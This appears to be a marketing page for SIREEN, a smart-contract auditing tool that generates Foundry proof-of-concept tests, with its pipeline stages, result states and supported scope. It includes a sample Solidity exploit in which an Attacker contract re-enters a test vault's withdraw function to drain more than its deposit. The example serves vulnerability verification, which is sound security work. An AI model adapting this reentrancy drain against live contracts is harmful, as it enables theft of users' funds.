The Challenge

Security research is hard.
Proving your suspicions is harder.

Smart contract security researchers face practical challenges every day. SIREEN is designed to help with the parts that a tool can assist — while keeping human judgment at the center.

🔍 Complex contracts hide attack paths

A modern DeFi protocol can have thousands of lines of Solidity across dozens of files. Spotting every potential vulnerability manually is exhausting and error-prone.

💡 Hypotheses need proof, not confidence

A static analyzer saying "this looks suspicious" is not enough. You need to know whether the suspicious pattern actually produces exploitable behavior.

⚙️ Manual PoC writing is repetitive

Writing Foundry tests for every hypothesis takes time. SIREEN generates the boilerplate so you can focus on the interesting cases.

📋 Evidence needs to be reproducible

A finding without reproducible evidence is hard to review, hard to fix, and hard to verify as resolved. Every claim should carry a chain of proof.

How It Works

Five stages. One honest chain of proof.

SIREEN does not claim to automate security auditing. It is a workspace where human researchers guide the process, supported by heuristic analysis and optional AI exploration, with every testable hypothesis put through executable verification.

Stage 1
Analyze

Inspect the smart contract project. Discover functions, state variables, external calls, and trust boundaries.

Heuristic
Stage 2
Explore

Identify potential issues and generate attack hypotheses. Heuristic patterns first. Optional AI can suggest additional angles.

Heuristic + Optional AI
Stage 3
Generate

Create a Foundry proof-of-concept test for the four vectors SIREEN can prove today: reentrancy, access control, unbounded-loop DoS, and accounting inconsistency.

Automated
Stage 4
Execute

Compile and run the PoC with Foundry. Record compile status, test output, gas usage, and assertion results.

Requires Forge
Stage 5
Verify

Present the evidence, the result, and the remaining uncertainty. A human researcher decides what it means.

Human Judgment
Stages may be unavailable depending on configuration

Without Foundry installed, Stage 4 (Execute) is skipped and findings remain "needs_review." Without an OpenRouter API key, Stage 2 uses only heuristic patterns. Unsupported vectors (oracle manipulation, flash loans, governance) are honestly skipped.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./VulnerableVault.sol";

contract PoC is Test {
    VulnerableVault public victim;
    uint256 constant POOL_SEED = 10 ether;
    uint256 constant ATTACK_DEPOSIT = 5 ether;
    uint256 constant WITHDRAWAL_UNIT = 1 ether;

    function setUp() public {
        victim = new VulnerableVault();
    }

    function testExploit() public {
        // 1) Seed pool liquidity from the test contract.
        victim.deposit{value: POOL_SEED}();
        uint256 vaultBefore = address(victim).balance;

        // 2) Attacker opens a position, then triggers withdraw.
        //    More than one unit leaves the pool inside a single
        //    transaction — impossible without reentrancy.
        Attacker att = new Attacker(address(victim));
        att.depositAndAttack{value: ATTACK_DEPOSIT}();

        // 3) Assertions: the pool lost at least two units and the
        //    attacker holds more than one unit.
        uint256 drained = vaultBefore - address(victim).balance;
        assertGe(drained, 2 * WITHDRAWAL_UNIT);
        assertGt(address(att).balance, WITHDRAWAL_UNIT);
    }
}

contract Attacker {
    VulnerableVault public victim;
    uint public count;
    uint256 constant ATTACKER_WITHDRAWAL_UNIT = 1 ether;
    uint256 constant ATTACK_DEPOSIT = 5 ether;

    constructor(address _victim) {
        victim = VulnerableVault(payable(_victim));
    }

    function depositAndAttack() external payable {
        victim.deposit{value: 1 ether}();
        victim.withdraw();
    }

    receive() external payable {
        // Re-enter only while the pool can still cover a withdrawal
        if (count < 3 && address(victim).balance >= ATTACKER_WITHDRAWAL_UNIT) {
            count++;
            victim.withdraw();
        }
    }
}

What does "confirmed" actually mean?

A finding is marked CONFIRMED only when the generated Foundry test compiled successfully and its security assertion passed. This proves the specific behavior exercised by the PoC — not every possible exploit variant, not the absence of other bugs, and not formal correctness.

Technical: The PoC is a Solidity test contract inheriting from forge-std/Test.sol. It runs via forge test. A passing test means the asserted condition held during execution. The assertion is chosen to be security-relevant (e.g., "unprivileged caller mutated state" or "attacker drained more than one withdrawal unit").
Honest Signals

SIREEN never says "looks secure."

Five explicit terminal states. No generic "success." Every outcome tells you exactly what happened and what you should do next.

CONFIRMED

Forge verified at least one finding. The PoC compiled and its security assertion passed. Evidence is complete.

DEGRADED

Findings exist but verification is incomplete. Forge was unavailable, or some findings still need manual review.

UNVERIFIED

Hypothesis generated but nothing executed. Coverage was insufficient to classify the run.

FAILED

Pipeline error, or every PoC failed compilation. No claim is made about security.

CLEAN_WITH_COVERAGE

No findings. Every hypothesis received a real Forge attempt. Not a security guarantee.

Current Scope

Built narrow on purpose.

SIREEN v0.1 focuses on what it can do well today. Out-of-scope vectors are honestly skipped rather than falsely claimed.

Supported Today
  • Single Solidity file or Foundry project directory
  • Offline heuristic hypotheses for reentrancy, access control, unbounded-loop DoS, and accounting inconsistency
  • Optional AI-assisted hypothesis exploration
  • Generated, compiled, executed Forge PoCs for those four vectors
  • Local Forge execution and verification
  • SQLite audit history with Markdown/JSON export
Not Yet Supported
  • Detection of oracle manipulation and flash loan patterns (PoC templates exist, but no heuristic raises these hypotheses)
  • Delegatecall, signature replay, and weak randomness PoCs (hypotheses may be raised, then explicitly skipped)
  • Governance / voting exploits
  • MEV and sandwich attacks
  • Move, Vyper, or Cairo
  • Formal verification or symbolic execution
  • Autonomous agent discovery
  • Cloud execution or team collaboration
Early-stage tester release

SIREEN v0.1 is intended for independent security researchers who understand its limitations. It does not replace a professional audit, discover all vulnerabilities, or guarantee security. AI-assisted mode is wired but unevaluated for hypothesis quality. The VS Code extension builds but has not been runtime-tested. Always combine tool output with manual review.
